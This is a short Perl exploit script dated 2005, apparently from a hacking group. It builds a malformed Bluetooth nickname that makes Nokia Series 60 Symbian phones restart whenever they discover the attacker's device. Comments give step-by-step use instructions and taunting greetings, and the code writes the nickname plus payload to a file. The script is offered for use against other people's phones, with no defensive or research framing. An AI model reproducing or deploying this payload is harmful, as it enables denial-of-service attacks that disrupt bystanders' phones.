#!/usr/bin/perl -w
 
# nokia_bt_rr.pl
# Qnix <Q-nix@hotmail.com>
# 2005-03-04
#
#
# Hello
# This exploit is for nokia symbian 60 (ser.60) , a vulnerability
# in nokia bluetooth , it cause a Remote restart for any one
# who search in bluetooth devices and find your nick name
# BOOMB AND HIS PHONE RESTARTS !!! ...
#
# Greets to : Vamp , beafcake , QatarBoy , C0NIK ,hailhackerz
# QEX , HaXeR , Silentneedle ,And all Security 4 Arab members
#
#
# HOW TO : -
#
# 1- Run the exploit and make a nickname .
# 2- Send the output to your nokia phone .
# 3- Open the file in your mobile and copy the nickname .
# 4- Paste the nickname in bluetooth phone name .
# 5- Have a nice time ;) .
#
#
 
 
my $btnick;
my $bth;
my  $bts;
my $file;
$bth = "
.";
print "\n*******************************************************\n";
print "**    NOKIA REMOTE RESTART IN BLUETOOTH NICKNAME     **\n";
print "**      BY QNIX | Q-nix[@]hotmail[dot]com            **\n";
print "**  GREETZ TO : vamp . beafcake , QatarBoy , C0NIK   **\n";
print "**     hailhackerz , QEX  , HaXeR ,  Silentneedle    **\n";
print "**          And all Security 4 Arab members          **\n";
print "*******************************************************\n";
print " \n WRITE YOUR BLUETOOTH NICKNAME : ";
$btnick = <STDIN>;
chomp($btnick);
print " \n OUTPUT : ";
$file = <STDIN>;
chomp($file);
open(BLUEN, ">>$file") || die "Could not create file $!\n";
$bts = "$btnick$bth";
print BLUEN ("$bts");
close(BLUEN);
 
print "\n Done !! :D HAVE A NICE TIME L4m3rZ \n\n";

